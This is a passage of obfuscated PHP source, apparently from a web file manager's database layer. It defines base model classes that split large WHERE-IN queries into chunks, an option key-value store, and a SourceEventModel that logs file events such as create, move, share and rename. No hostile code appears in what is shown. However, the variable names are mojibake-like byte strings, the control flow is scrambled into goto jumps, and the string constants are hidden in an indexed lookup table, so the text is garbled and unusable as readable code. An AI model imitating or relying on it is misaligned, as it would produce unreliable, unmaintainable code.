$this->_beforeInsert($A´Â±¹À[$FçÁ‚Æ‘Àˆ], $D ã¬Â“¶î); } goto a¼¾„İ™Ô; a–¹—˜Ÿˆ: } public function save($A¯ÏîƒÂï® = '', $bá´·šŸÇ = array()) { goto aİÄÇ¿ÓÄÖ; E¼¹…¤å‚œ: $EàÉÑ×»¸Ã = $E‰äÓ¨çóÙ[$dä„Ëõ’ôº[282]][$eö»ÑĞ”ÕÏ][1]; $EàÉÑ×»¸Ã = is_array($EàÉÑ×»¸Ã) ? $EàÉÑ×»¸Ã : array(); $FŠàÙ¥èĞµ = count($EàÉÑ×»¸Ã); goto eì ™°Îƒæ; eì ™°Îƒæ: for ($c½ÂŒÍæšô = 0; $c½ÂŒÍæšô < $FŠàÙ¥èĞµ; $c½ÂŒÍæšô += $BÕØØÙÛÆÀ) { $fµ§¢ºƒÒö = array_slice($EàÉÑ×»¸Ã, $c½ÂŒÍæšô, $BÕØØÙÛÆÀ); if (!is_array($fµ§¢ºƒÒö) || count($fµ§¢ºƒÒö) == 0) { break; } $E‰äÓ¨çóÙ[$dä„Ëõ’ôº[282]][$eö»ÑĞ”ÕÏ][1] = $fµ§¢ºƒÒö; $this->optionsValue($E‰äÓ¨çóÙ); $Eš×¤’÷´ += parent::save($A¯ÏîƒÂï®, $bá´·šŸÇ); $this->chunkEventCheck(count($fµ§¢ºƒÒö)); } $this->chunkEventSet(); return $Eš×¤’÷´; goto dŒ²¶¶ŠØ; e‘Ä¬Ç³‚š: $eö»ÑĞ”ÕÏ = $this->findWhereField($E‰äÓ¨çóÙ); if (!$eö»ÑĞ”ÕÏ) { return parent::save($A¯ÏîƒÂï®, $bá´·šŸÇ); } $Eš×¤’÷´ = 0; goto E¼¹…¤å‚œ; aİÄÇ¿ÓÄÖ: $dä„Ëõ’ôº =& $_SERVER[úÉ·öƒÑì©]; $BÕØØÙÛÆÀ = self::SQL_WHERE_IN_CHUNK; $E‰äÓ¨çóÙ = $this->optionsValue(); goto e‘Ä¬Ç³‚š; dŒ²¶¶ŠØ: } public function add($D„Ÿ¡àùæó = '', $cİé¥¸Ë®” = array(), $E‚ÔÜÄ¤ÁÙ = false) { if ($this->addTaskStatus && is_array($D„Ÿ¡àùæó)) { $this->addTaskData[] = $D„Ÿ¡àùæó; return; } return parent::add($D„Ÿ¡àùæó, $cİé¥¸Ë®”, $E‚ÔÜÄ¤ÁÙ); } public function parseWhereLike($f ¨ÅãÜ‘, $Cá„œ³ÚÎƒ = '', $e«°±ÓèÉî = false, &$c°‚ØÎ­ˆ = false) { goto B¯‰ìõ¡Õ; B¯‰ìõ¡Õ: $e«ÍÈ™ºã¬ =& $_SERVER[úÉ·öƒÑì©]; $c“­²‰”†ô = $GLOBALS[$e«ÍÈ™ºã¬[6]][$e«ÍÈ™ºã¬[387]]; if (!$c“­²‰”†ô[$e«ÍÈ™ºã¬[388]]) { return $f ¨ÅãÜ‘; } goto D”„ÖØ‹˜®; D”„ÖØ‹˜®: if (!is_array($f ¨ÅãÜ‘)) { return $f ¨ÅãÜ‘; } $EÑ¤‘ÏÈ = array(); $Eéˆ°´Ù‚È = 0; goto Bèõöß™İ; Bèõöß™İ: foreach ($f ¨ÅãÜ‘ as $Cò‚Ù‘Ì” => $dÔéØØª™Ñ) { if (is_array($dÔéØØª™Ñ) && count($dÔéØØª™Ñ) == 2 && $dÔéØØª™Ñ[0] == $e«ÍÈ™ºã¬[389] && is_string($dÔéØØª™Ñ[1]) && substr($dÔéØØª™Ñ[1], 0, 1) == $e«ÍÈ™ºã¬[390] && substr($dÔéØØª™Ñ[1], strlen($dÔéØØª™Ñ[1]) - 1, 1) == $e«ÍÈ™ºã¬[390]) { goto D•Óö×Şá™; D•Óö×Şá™: $c°‚ØÎ­ˆ = !0; $A´ÕåË÷·Š = is_string($Cò‚Ù‘Ì”) ? $Cò‚Ù‘Ì” : $Cá„œ³ÚÎƒ; $bŠ‹†µœÒ = substr($dÔéØØª™Ñ[1], 1, strlen($dÔéØØª™Ñ[1]) - 2); goto AÏÛ„àœè; eÉî‘ĞÛ°â: if ($c“­²‰”†ô[$e«ÍÈ™ºã¬[392]]) { $BğÏÃ¤ÎŒ = $e«ÍÈ™ºã¬[393] . $bŠ‹†µœÒ . $e«ÍÈ™ºã¬[394]; if ($c“­²‰”†ô[$e«ÍÈ™ºã¬[395]]) { $BğÏÃ¤ÎŒ = $e«ÍÈ™ºã¬[394] . $bŠ‹†µœÒ . $e«ÍÈ™ºã¬[393]; } } $EÑ¤‘ÏÈ[$Eéˆ°´Ù‚È] = $e«ÍÈ™ºã¬[396] . $A´ÕåË÷·Š . $e«ÍÈ™ºã¬[397] . $BğÏÃ¤ÎŒ . $e«ÍÈ™ºã¬[398]; $Eéˆ°´Ù‚È++; goto dÜñù×‹„; AÏÛ„àœè: $bŠ‹†µœÒ = $this->db->escapeString($bŠ‹†µœÒ); if (!strpos($A´ÕåË÷·Š, $e«ÍÈ™ºã¬[95])) { $A´ÕåË÷·Š = $e«ÍÈ™ºã¬[391] . $A´ÕåË÷·Š . $e«ÍÈ™ºã¬[391]; } $BğÏÃ¤ÎŒ = $e«ÍÈ™ºã¬[182] . $bŠ‹†µœÒ . $e«ÍÈ™ºã¬[182]; goto eÉî‘ĞÛ°â; dÜñù×‹„: continue; goto dÂ£…á¡†; dÂ£…á¡†: } if (is_array($dÔéØØª™Ñ)) { $Cá„œ³ÚÎƒ = is_string($Cò‚Ù‘Ì”) ? $Cò‚Ù‘Ì” : $Cá„œ³ÚÎƒ; $dÔéØØª™Ñ = $this->parseWhereLike($dÔéØØª™Ñ, $Cá„œ³ÚÎƒ, !0, $c°‚ØÎ­ˆ); } if (is_numeric($Cò‚Ù‘Ì”)) { $EÑ¤‘ÏÈ[$Eéˆ°´Ù‚È] = $dÔéØØª™Ñ; $Eéˆ°´Ù‚È++; } else { $EÑ¤‘ÏÈ[$Cò‚Ù‘Ì”] = $dÔéØØª™Ñ; } } if ($c°‚ØÎ­ˆ && !$e«°±ÓèÉî) { } return $EÑ¤‘ÏÈ; goto BÀ‘œÛä¹; BÀ‘œÛä¹: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($AôËÜˆ·Î = array()) { goto aõùˆº¼¸; dÕ‹Í¨ğº: $aÄîÀ¤¦¬¦ = $this->findWhereField($F²³°¸Õä“); if (!$aÄîÀ¤¦¬¦ || isset($F²³°¸Õä“[$BØ»¼¦¥ç¢[299]]) || isset($F²³°¸Õä“[$BØ»¼¦¥ç¢[360]])) { return parent::select($AôËÜˆ·Î); } $FğÆöò š = $F²³°¸Õä“[$BØ»¼¦¥ç¢[282]][$aÄîÀ¤¦¬¦][1]; goto dõº‚³¼È; dõº‚³¼È: $FğÆöò š = is_array($FğÆöò š) ? $FğÆöò š : array(); $B„ŸÎ±İå = null; for ($Aò‹íôôæµ = 0; $Aò‹íôôæµ < count($FğÆöò š); $Aò‹íôôæµ += $a½Ø±šÓ§) { $bºîŠøÔœõ = array_slice($FğÆöò š, $Aò‹íôôæµ, $a½Ø±šÓ§); if (!is_array($bºîŠøÔœõ) || count($bºîŠøÔœõ) == 0) { break; } $F²³°¸Õä“[$BØ»¼¦¥ç¢[282]][$aÄîÀ¤¦¬¦][1] = $bºîŠøÔœõ; $this->optionsValue($F²³°¸Õä“); $cã¼Ø‚í = parent::select($AôËÜˆ·Î); if (!$cã¼Ø‚í) { continue; } $B„ŸÎ±İå = is_array($B„ŸÎ±İå) ? $B„ŸÎ±İå : array(); $B„ŸÎ±İå = array_merge($B„ŸÎ±İå, $cã¼Ø‚í); } goto Cñ‡¬‰Ğ™ä; aõùˆº¼¸: $BØ»¼¦¥ç¢ =& $_SERVER[úÉ·öƒÑì©]; $a½Ø±šÓ§ = self::SQL_WHERE_IN_CHUNK; $F²³°¸Õä“ = $this->optionsValue(); goto dÕ‹Í¨ğº; Cñ‡¬‰Ğ™ä: return $B„ŸÎ±İå; goto a×Ú†¯ßàº; a×Ú†¯ßàº: } public function delete($B³©äÎŸ¶Ä = array()) { goto AÌ™’éÆŞµ; AÌ™’éÆŞµ: $d²–öùŒ„´ =& $_SERVER[úÉ·öƒÑì©]; $d³Î‹ØëÉò = self::SQL_WHERE_IN_CHUNK; $fÙ¨àŒÃœ© = $this->optionsValue(); goto d«••ºøÍä; d«••ºøÍä: $dÍËˆ»Ó‹ = $this->findWhereField($fÙ¨àŒÃœ©); if (!$dÍËˆ»Ó‹) { return parent::delete($B³©äÎŸ¶Ä); } $eßË¢­½Æ = 0; goto CˆÂç½”‘‹; dªò­ºôôİ: return $eßË¢­½Æ; goto f‡Ë¯¯–”ª; CˆÂç½”‘‹: $c”ˆçŠÎâ¸ = $fÙ¨àŒÃœ©[$d²–öùŒ„´[282]][$dÍËˆ»Ó‹][1]; $c”ˆçŠÎâ¸ = is_array($c”ˆçŠÎâ¸) ? $c”ˆçŠÎâ¸ : array(); for ($CÃ„î•í§´ = 0; $CÃ„î•í§´ < count($c”ˆçŠÎâ¸); $CÃ„î•í§´ += $d³Î‹ØëÉò) { $b‚¯°†µ±ˆ = array_slice($c”ˆçŠÎâ¸, $CÃ„î•í§´, $d³Î‹ØëÉò); if (!is_array($b‚¯°†µ±ˆ) || count($b‚¯°†µ±ˆ) == 0) { break; } $fÙ¨àŒÃœ©[$d²–öùŒ„´[282]][$dÍËˆ»Ó‹][1] = $b‚¯°†µ±ˆ; $this->optionsValue($fÙ¨àŒÃœ©); $eßË¢­½Æ += parent::delete($B³©äÎŸ¶Ä); } goto dªò­ºôôİ; f‡Ë¯¯–”ª: } private function findWhereField($a‹•”¼„”É) { $a÷â‰è¼Ìò =& $_SERVER[úÉ·öƒÑì©]; $AæŠÓ¯÷Ç = self::SQL_WHERE_IN_CHUNK; if (!is_array($a‹•”¼„”É) || !is_array($a‹•”¼„”É[$a÷â‰è¼Ìò[282]])) { return !1; } foreach ($a‹•”¼„”É[$a÷â‰è¼Ìò[282]] as $a“¦²ÛóáÃ => $aÇİÍöïÇ¬) { if (is_array($aÇİÍöïÇ¬) && isset($aÇİÍöïÇ¬[0]) && is_string($aÇİÍöïÇ¬[0]) && strtolower($aÇİÍöïÇ¬[0]) == $a÷â‰è¼Ìò[7] && is_array($aÇİÍöïÇ¬[1]) && count($aÇİÍöïÇ¬[1]) > $AæŠÓ¯÷Ç) { ignore_timeout(); return $a“¦²ÛóáÃ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\164\145\x6d\x4f\x70\164\x69\x6f\x6e"; public $field = array(); public function listData($dÁ—¯ÄÕ§Í = false, $d¿‡İŠÌ›Ä = "\155\x6f\144\151\x66\x79\124\151\x6d\x65", $f×…¹ÔŞŞñ = false) { $F®¡È‰ª‚ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$F®¡È‰ª‚) { return $dÁ—¯ÄÕ§Í ? null : array(); } if (!$dÁ—¯ÄÕ§Í) { $F®¡È‰ª‚ = array_filter(array_values($F®¡È‰ª‚)); return array_sort_by($F®¡È‰ª‚, $d¿‡İŠÌ›Ä, $f×…¹ÔŞŞñ); } return $F®¡È‰ª‚[$_SERVER[úÉ·öƒÑì©][399] . $dÁ—¯ÄÕ§Í]; } public function insert($E‚‰é½Ûšİ) { goto D½ã†¸•’„; c¿Ô„¾à¹: return $BšÜ…Ğ»¨­; goto F¨àÓ†ª…; cÃ°°†²Ê : $BšÜ…Ğ»¨­ = $BšÜ…Ğ»¨­ ? $BšÜ…Ğ»¨­ : 0; $E‚‰é½Ûšİ[$Aá›½Âºà‰[402]] = ++$BšÜ…Ğ»¨­; $E‚‰é½Ûšİ[$Aá›½Âºà‰[194]] = time(); goto fà¦†¹Ç³; D½ã†¸•’„: $Aá›½Âºà‰ =& $_SERVER[úÉ·öƒÑì©]; $E‚‰é½Ûšİ = array_field_key($E‚‰é½Ûšİ, $this->field); $BšÜ…Ğ»¨­ = Model($this->modelType)->get($Aá›½Âºà‰[400], $this->optionType . $Aá›½Âºà‰[401]); goto cÃ°°†²Ê ; fà¦†¹Ç³: $E‚‰é½Ûšİ[$Aá›½Âºà‰[84]] = time(); Model($this->modelType)->set($Aá›½Âºà‰[400], $BšÜ…Ğ»¨­, $this->optionType . $Aá›½Âºà‰[401]); Model($this->modelType)->set($Aá›½Âºà‰[399] . $BšÜ…Ğ»¨­, $E‚‰é½Ûšİ, $this->optionType); goto c¿Ô„¾à¹; F¨àÓ†ª…: } public function update($A¶¢äâ‘Æ, $E³È˜ÁÓ¸) { goto dÇ«¼„«¬³; fÍ“„¡‹ñ: if (!$f¢ÓÀùøÇŸ) { return !1; } $E³È˜ÁÓ¸ = array_merge($f¢ÓÀùøÇŸ, $E³È˜ÁÓ¸); $E³È˜ÁÓ¸[$B“¡„ƒ‰¾‡[84]] = time(); goto eŒ§™Ã×šŠ; dÇ«¼„«¬³: $B“¡„ƒ‰¾‡ =& $_SERVER[úÉ·öƒÑì©]; $E³È˜ÁÓ¸ = array_field_key($E³È˜ÁÓ¸, $this->field); $f¢ÓÀùøÇŸ = $this->listData($A¶¢äâ‘Æ); goto fÍ“„¡‹ñ; eŒ§™Ã×šŠ: return Model($this->modelType)->set($B“¡„ƒ‰¾‡[399] . $A¶¢äâ‘Æ, $E³È˜ÁÓ¸, $this->optionType); goto eŞöìİ§§’; eŞöìİ§§’: } public function remove($CßğñòÊÉ) { return Model($this->modelType)->remove($_SERVER[úÉ·öƒÑì©][399] . $CßğñòÊÉ, $this->optionType); } public function clear() { $c²¾ëÎêà =& $_SERVER[úÉ·öƒÑì©]; Model($this->modelType)->remove($c²¾ëÎêà[400], $this->optionType . $c²¾ëÎêà[401]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($eÙ­Üé­ÙŞ, $dàÖ¡¯¬ÌŸ) { if (!$dàÖ¡¯¬ÌŸ) { return !1; } $f¹ÄËíùîñ = $this->listData(); $f¹ÄËíùîñ = array_to_keyvalue($f¹ÄËíùîñ, $eÙ­Üé­ÙŞ); return isset($f¹ÄËíùîñ[$dàÖ¡¯¬ÌŸ]) ? $f¹ÄËíùîñ[$dàÖ¡¯¬ÌŸ] : !1; } public function findByName($c®Ş›ª×ñ) { return $this->findByKey($_SERVER[úÉ·öƒÑì©][28], $c®Ş›ª×ñ); } protected function resetData($b¿§ÆÍ‡ôª) { $DœÓêÙÁ¢¨ =& $_SERVER[úÉ·öƒÑì©]; $b¿§ÆÍ‡ôª = is_array($b¿§ÆÍ‡ôª) ? $b¿§ÆÍ‡ôª : array(); $e…ˆ÷£Â¼à = array(); for ($fàÖÆ±å¯œ = 0; $fàÖÆ±å¯œ < count($b¿§ÆÍ‡ôª); $fàÖÆ±å¯œ++) { $e…ˆ÷£Â¼à[$DœÓêÙÁ¢¨[399] . $b¿§ÆÍ‡ôª[$fàÖÆ±å¯œ][$DœÓêÙÁ¢¨[402]]] = $b¿§ÆÍ‡ôª[$fàÖÆ±å¯œ]; } return Model($this->modelType)->set($e…ˆ÷£Â¼à, !1, $this->optionType); } private function getAutoName($C¤–§Œ‘İ) { $BÆ‹À¹Š = array_to_keyvalue($this->listData(), $_SERVER[úÉ·öƒÑì©][28]); if (!$BÆ‹À¹Š || !isset($BÆ‹À¹Š[$C¤–§Œ‘İ])) { return $C¤–§Œ‘İ; } for ($aÛ÷İÕ¤­Æ = 1; $aÛ÷İÕ¤­Æ < count($BÆ‹À¹Š); $aÛ÷İÕ¤­Æ++) { $CÅÀˆ‡ÈŸÓ = $C¤–§Œ‘İ . "\50{$aÛ÷İÕ¤­Æ}\51"; if (!isset($BÆ‹À¹Š[$CÅÀˆ‡ÈŸÓ])) { return $CÅÀˆ‡ÈŸÓ; } } return $CÅÀˆ‡ÈŸÓ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($e¦Ÿƒªá = false, $B½°”‡Œ× = '', $AÜõÚøÕ÷ = false) { goto DñˆôÈˆŠ¥; fÜƒçšŸ¿: $cĞˆƒ¥Ú¯Ã = is_array($cĞˆƒ¥Ú¯Ã) ? $cĞˆƒ¥Ú¯Ã : array(); if (is_array($A÷ÂËˆ»Îˆ)) { $A÷ÂËˆ»Îˆ = array_merge($cĞˆƒ¥Ú¯Ã, $A÷ÂËˆ»Îˆ); return $e¦Ÿƒªá ? isset($A÷ÂËˆ»Îˆ[$e¦Ÿƒªá]) ? $A÷ÂËˆ»Îˆ[$e¦Ÿƒªá] : null : $A÷ÂËˆ»Îˆ; } $eˆìÚÄ˜Ö = $this->filterWhere(array($A‹±ŞÃˆ½§[29] => $B½°”‡Œ×)); goto d¯Ÿ°‰ç÷†; d¯Ÿ°‰ç÷†: $A÷ÂËˆ»Îˆ = $this->where($eˆìÚÄ˜Ö)->select(); $A÷ÂËˆ»Îˆ = array_to_keyvalue($A÷ÂËˆ»Îˆ, $A‹±ŞÃˆ½§[93], $A‹±ŞÃˆ½§[381]); foreach ($A÷ÂËˆ»Îˆ as $cºç«İ°—º => $cÀÍ¾Ááá’) { if ($AÜõÚøÕ÷ || in_array($cºç«İ°—º, $this->jsonField)) { $A÷ÂËˆ»Îˆ[$cºç«İ°—º] = json_decode($cÀÍ¾Ááá’, !0); } } goto Eò¤É‹»¯Ş; Eò¤É‹»¯Ş: $this->cacheSet($B½°”‡Œ×, $A÷ÂËˆ»Îˆ); $A÷ÂËˆ»Îˆ = array_merge($cĞˆƒ¥Ú¯Ã, $A÷ÂËˆ»Îˆ); return $e¦Ÿƒªá ? $A÷ÂËˆ»Îˆ[$e¦Ÿƒªá] : $A÷ÂËˆ»Îˆ; goto CÎÑ¶õâ¡; DñˆôÈˆŠ¥: $A‹±ŞÃˆ½§ =& $_SERVER[úÉ·öƒÑì©]; $A÷ÂËˆ»Îˆ = $this->cacheGet($B½°”‡Œ×); $cĞˆƒ¥Ú¯Ã = $this->optionDefault($B½°”‡Œ×); goto fÜƒçšŸ¿; CÎÑ¶õâ¡: } public function set($c‚‡Ÿ…¾ë™, $EˆÓòŒÌ« = false, $Dõœª±–¨ƒ = '') { goto FÒ°öæÚÏ; b·ƒÚñÕŸõ: return $this->addAll($eö…Ê†éğ, array(), !0); goto B­µ¶ƒë; DÈŞÈ±›í: $FòÔìÖªÖ = is_array($c‚‡Ÿ…¾ë™) ? $c‚‡Ÿ…¾ë™ : array($c‚‡Ÿ…¾ë™ => $EˆÓòŒÌ«); foreach ($FòÔìÖªÖ as $BŸÄ·³í => $B×¯ˆôë ¦) { if (is_array($B×¯ˆôë ¦)) { $B×¯ˆôë ¦ = json_encode_force($B×¯ˆôë ¦); } $this->checkLength($B×¯ˆôë ¦, !1, $this->tableName . $aŸÍ¹Ò¿Ü[4] . $c‚‡Ÿ…¾ë™); $B×¯ˆôë ¦ = self::textEncode($B×¯ˆôë ¦); $FòÔìÖªÖ = array($aŸÍ¹Ò¿Ü[29] => $Dõœª±–¨ƒ, $aŸÍ¹Ò¿Ü[93] => $BŸÄ·³í, $aŸÍ¹Ò¿Ü[381] => $B×¯ˆôë ¦); $eö…Ê†éğ[] = $this->filterWhere($FòÔìÖªÖ); } if (!$eö…Ê†éğ) { return !0; } goto b·ƒÚñÕŸõ; FÒ°öæÚÏ: $aŸÍ¹Ò¿Ü =& $_SERVER[úÉ·öƒÑì©]; $this->cacheRemove($Dõœª±–¨ƒ); $eö…Ê†éğ = array(); goto DÈŞÈ±›í; B­µ¶ƒë: } protected function optionDefault($fŒŠø·ì¼Š = '') { return !1; } public function setDeep($bÄ®»²ñ»‰, $fò…ÎªâöÉ = false, $aØ×²óĞ½¶ = '') { $B“ÎÍİºÍÚ = explode($_SERVER[úÉ·öƒÑì©][95], $bÄ®»²ñ»‰); $E©í¿ê°Á† = $this->get(); array_set_value($E©í¿ê°Á†, $bÄ®»²ñ»‰, $fò…ÎªâöÉ); $this->set($B“ÎÍİºÍÚ[0], $E©í¿ê°Á†[$B“ÎÍİºÍÚ[0]], $aØ×²óĞ½¶); } public function remove($DÕ³×ÏÍ¸‰, $f†ÔŠÆéŞ = '') { $FƒëÏŒ‹Á½ =& $_SERVER[úÉ·öƒÑì©]; $this->cacheRemove($f†ÔŠÆéŞ); $D™ó£Æ­Æª = $this->filterWhere(array($FƒëÏŒ‹Á½[93] => $DÕ³×ÏÍ¸‰, $FƒëÏŒ‹Á½[29] => $f†ÔŠÆéŞ)); if (is_null($DÕ³×ÏÍ¸‰)) { unset($D™ó£Æ­Æª[$FƒëÏŒ‹Á½[93]]); } return $this->where($D™ó£Æ­Æª)->delete(); } public function cacheSet($DÁŒµŒã±•, $d×Øöİœ‹ù = false) { return Cache::set($this->cacheKey($DÁŒµŒã±•), $d×Øöİœ‹ù); } public function cacheGet($a¤Ğ“ÂíŒ) { return Cache::get($this->cacheKey($a¤Ğ“ÂíŒ)); } public function cacheRemove($B©œ½‘Ÿ„º) { return Cache::remove($this->cacheKey($B©œ½‘Ÿ„º)); } protected function filterWhere($aÍ¶ß»‡ô) { return $aÍ¶ß»‡ô; } protected function cacheKey($FŠÊáíŞ¢Â) { return $FŠÊáíŞ¢Â; } } goto D–Ş±ê‡Òø; d¬ñî¾ğÌĞ: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\162\x63\145\137\x65\x76\145\x6e\164"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\124\x69\155\x65", "\164\x69\155\145", "\151\x6e\163\145\x72\164", "\146\x75\x6e\143\164\151\157\156"), array("\144\145\163\x63", '', "\151\x6e\x73\145\162\x74\x2c\165\160\x64\141\x74\145\x2c\163\145\154\x65\143\x74", "\x6a\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($A´œíÄù”¨, $f¬¹Ñ•¶êŞ, $CË™Ò‘¥³¼ = '') { goto Eù»õ¤éøä; eùÂµÌÃ©‡: return $this->add($a›†Ç²á); goto fáä±ªÉ’Ì; a´‘àñùÃ§: if (!$F´§¾ÀÙ²») { return !1; } if ($this->isCacheEvent($F´§¾ÀÙ²», $f¬¹Ñ•¶êŞ)) { return; } if ($CË™Ò‘¥³¼ && is_string($CË™Ò‘¥³¼)) { $CË™Ò‘¥³¼ = array($FÌëìÊõ¢®[1732] => $CË™Ò‘¥³¼); } goto bÂ«Ÿ£§°Á; Eù»õ¤éøä: $FÌëìÊõ¢® =& $_SERVER[úÉ·öƒÑì©]; if (!$this->eventSave) { return; } $F´§¾ÀÙ²» = Model($FÌëìÊõ¢®[1213])->sourceInfo($A´œíÄù”¨); goto a´‘àñùÃ§; bÂ«Ÿ£§°Á: $a›†Ç²á = array($FÌëìÊõ¢®[419] => $A´œíÄù”¨, $FÌëìÊõ¢®[1907] => $F´§¾ÀÙ²»[$FÌëìÊõ¢®[487]], $FÌëìÊõ¢®[1908] => $F´§¾ÀÙ²»[$FÌëìÊõ¢®[28]], $FÌëìÊõ¢®[504] => !empty($F´§¾ÀÙ²»[$FÌëìÊõ¢®[504]]) ? $F´§¾ÀÙ²»[$FÌëìÊõ¢®[504]] : $FÌëìÊõ¢®[33], $FÌëìÊõ¢®[1527] => USER_ID, $FÌëìÊõ¢®[424] => $f¬¹Ñ•¶êŞ, $FÌëìÊõ¢®[1529] => $CË™Ò‘¥³¼); $this->addSystemLog($f¬¹Ñ•¶êŞ, $a›†Ç²á); unset($a›†Ç²á[$FÌëìÊõ¢®[1908]], $a›†Ç²á[$FÌëìÊõ¢®[504]]); goto eùÂµÌÃ©‡; fáä±ªÉ’Ì: } private function addSystemLog($Fá¥ßÛš¶”, $Aˆ¨¸º²Ù) { $Fõ™ãà«©Å =& $_SERVER[úÉ·öƒÑì©]; if ($Fá¥ßÛš¶” == $Fõ™ãà«©Å[1909]) { $Fá¥ßÛš¶” = $Aˆ¨¸º²Ù[$Fõ™ãà«©Å[440]][$Fõ™ãà«©Å[1910]]; } else { if (in_array($Fá¥ßÛš¶”, array($Fõ™ãà«©Å[1676], $Fõ™ãà«©Å[1911]))) { $Fá¥ßÛš¶” = $Aˆ¨¸º²Ù[$Fõ™ãà«©Å[440]][$Fõ™ãà«©Å[731]]; } } $bíäè©ÉŠƒ = array_merge($Aˆ¨¸º²Ù, array($Fõ™ãà«©Å[1912] => $Aˆ¨¸º²Ù[$Fõ™ãà«©Å[404]], $Fõ™ãà«©Å[1913] => $Aˆ¨¸º²Ù[$Fõ™ãà«©Å[1913]])); Model($Fõ™ãà«©Å[1640])->addLog($Fõ™ãà«©Å[1914] . $Fá¥ßÛš¶”, $bíäè©ÉŠƒ); } private function isCacheEvent($C­ëŒŒ„ö, $eó‰½èÌ‡š) { if ($C­ëŒŒ„ö[$_SERVER[úÉ·öƒÑì©][413]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($CÏ‰§ç÷×Û, $BÎ¼£Â¦ãÉ) { $C¿ó ±°‘• =& $_SERVER[úÉ·öƒÑì©]; $F¿ù™²¯Ö = Model($C¿ó ±°‘•[1213])->sourceInfo($CÏ‰§ç÷×Û); $c‰íì¦ÂÔÍ = array($C¿ó ±°‘•[1910] => $BÎ¼£Â¦ãÉ, $C¿ó ±°‘•[28] => $F¿ù™²¯Ö[$C¿ó ±°‘•[28]]); return $this->addEvent($CÏ‰§ç÷×Û, $C¿ó ±°‘•[1909], $c‰íì¦ÂÔÍ); } public function eventFileEdit($cñ¨ÕÈ´ŠÛ) { $dãÙ‘™š§ä =& $_SERVER[úÉ·öƒÑì©]; $BÔ£Ô«Ôø¸ = array($dãÙ‘™š§ä[1915] => $_SERVER[$dãÙ‘™š§ä[1916]], $dãÙ‘™š§ä[1917] => strtolower(ACTION)); return $this->addEvent($cñ¨ÕÈ´ŠÛ, $dãÙ‘™š§ä[1666], $BÔ£Ô«Ôø¸); } public function eventRecycle($c÷£Ìø½ìÁ, $Døº¼“…) { return $this->addEvent($c÷£Ìø½ìÁ, $_SERVER[úÉ·öƒÑì©][1911], $Døº¼“…); } public function eventRemove($DÕ±Û‹œ‚ï) { $d±èƒ™•ŒÁ =& $_SERVER[úÉ·öƒÑì©]; $EçÊà±½§¬ = Model($d±èƒ™•ŒÁ[1213])->sourceInfo($DÕ±Û‹œ‚ï); $Aâê·Á¬×‚ = $EçÊà±½§¬[$d±èƒ™•ŒÁ[28]]; return $this->addEvent($EçÊà±½§¬[$d±èƒ™•ŒÁ[487]], $d±èƒ™•ŒÁ[1665], $Aâê·Á¬×‚); } public function eventShare($BœŠÎœÍñÈ, $F£ñÅÄ¢Ô) { return $this->addEvent($BœŠÎœÍñÈ, $_SERVER[úÉ·öƒÑì©][1676], $F£ñÅÄ¢Ô); } public function eventMove($D­äÇ•À«, $Cê“¤Íö‰ä, $EÔ÷ò‰ñ ) { goto Dº¤ë”‡ñ; dò×³•Šœñ: $this->addEvent($D­äÇ•À«, $bãƒÁœŒ‹[529], $E¼å‰‡‚È­); $b³À…£Ğç = $DššÑ¬Î->sourceInfo($D­äÇ•À«); $E¼å‰‡‚È­ = array($bãƒÁœŒ‹[404] => $b³À…£Ğç[$bãƒÁœŒ‹[404]], $bãƒÁœŒ‹[28] => $b³À…£Ğç[$bãƒÁœŒ‹[28]]); goto bÌ°Ü­‹õá; bÌ°Ü­‹õá: $this->addEvent($Cê“¤Íö‰ä, $bãƒÁœŒ‹[1921], $E¼å‰‡‚È­); goto F™¡¶†â ; eä¹°Ê¬˜›: $C È¯îê©† = $DššÑ¬Î->sourceInfo($Cê“¤Íö‰ä); $a¦¼†±ƒ¾ = $DššÑ¬Î->sourceInfo($EÔ÷ò‰ñ ); $E¼å‰‡‚È­ = array($bãƒÁœŒ‹[1063] => $Cê“¤Íö‰ä, $bãƒÁœŒ‹[1918] => $C È¯îê©†[$bãƒÁœŒ‹[28]], $bãƒÁœŒ‹[1898] => !empty($C È¯îê©†[$bãƒÁœŒ‹[504]]) ? $C È¯îê©†[$bãƒÁœŒ‹[504]] : $bãƒÁœŒ‹[33], $bãƒÁœŒ‹[1064] => $EÔ÷ò‰ñ , $bãƒÁœŒ‹[1919] => $a¦¼†±ƒ¾[$bãƒÁœŒ‹[28]], $bãƒÁœŒ‹[1920] => !empty($a¦¼†±ƒ¾[$bãƒÁœŒ‹[504]]) ? $a¦¼†±ƒ¾[$bãƒÁœŒ‹[504]] : $bãƒÁœŒ‹[33]); goto dò×³•Šœñ; Dº¤ë”‡ñ: $bãƒÁœŒ‹ =& $_SERVER[úÉ·öƒÑì©]; $DššÑ¬Î = Model($bãƒÁœŒ‹[1213]); $b³À…£Ğç = $DššÑ¬Î->sourceInfo($D­äÇ•À«); goto eä¹°Ê¬˜›; F™¡¶†â : } public function eventCopy($C«èŸ×¢Œ) { $this->eventCreate($C«èŸ×¢Œ, $_SERVER[úÉ·öƒÑì©][527]); } public function eventRename($a¸¤ä•ìŸ, $FˆùŸù×ğÔ, $D’ŠŸà•†Ñ) { $DºÊã¸Ï¯ =& $_SERVER[úÉ·öƒÑì©]; $E™ßˆĞšœ = array($DºÊã¸Ï¯[1063] => $FˆùŸù×ğÔ, $DºÊã¸Ï¯[1064] => $D’ŠŸà•†Ñ); return $this->addEvent($a¸¤ä•ìŸ, $DºÊã¸Ï¯[1227], $E™ßˆĞšœ); } public function eventAddComment($F—ê±ÉŠÑÉ, $f¯ƒŸ§¡‰—) { return $this->addEvent($F—ê±ÉŠÑÉ, $_SERVER[úÉ·öƒÑì©][1922], $f¯ƒŸ§¡‰—); } public function eventAddDesc($CÑêù‹©è, 